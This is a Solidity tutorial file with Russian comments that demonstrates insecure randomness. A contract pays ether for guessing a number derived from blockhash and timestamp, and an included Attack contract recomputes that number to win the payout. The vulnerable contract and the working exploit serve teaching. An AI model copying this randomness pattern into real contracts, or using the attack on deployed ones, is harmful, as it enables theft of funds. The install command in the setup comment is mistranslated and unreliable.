/*
Источник случайности
Уязвимость
blockhashи block.timestampне являются надежными источниками случайности.
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
ПРИМЕЧАНИЕ: нельзя использовать блокхеш в Remix, поэтому используйте ganache-cli

npm i -g ганаш-кли
ганаш-кли
В среде переключения ремикса на провайдера Web3
*/

/*
GuessTheRandomNumber — это игра, в которой вы выиграете 1 эфир, если сможете угадать
псевдослучайное число, сгенерированное из хэша блока и метки времени.

На первый взгляд кажется невозможным угадать правильное число.
Но давайте посмотрим, как легко это победить.

1. Алиса развертывает GuessTheRandomNumber с 1 эфиром
2. Ева разворачивает Атаку
3. Ева вызывает Attack.attack() и выигрывает 1 эфир.

Что случилось?
Атака вычислила правильный ответ, просто скопировав код, вычисляющий случайное число.
*/
contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}

contract Attack {
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        guessTheRandomNumber.guess(answer);
    }

    // Вспомогательная функция для проверки баланса
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
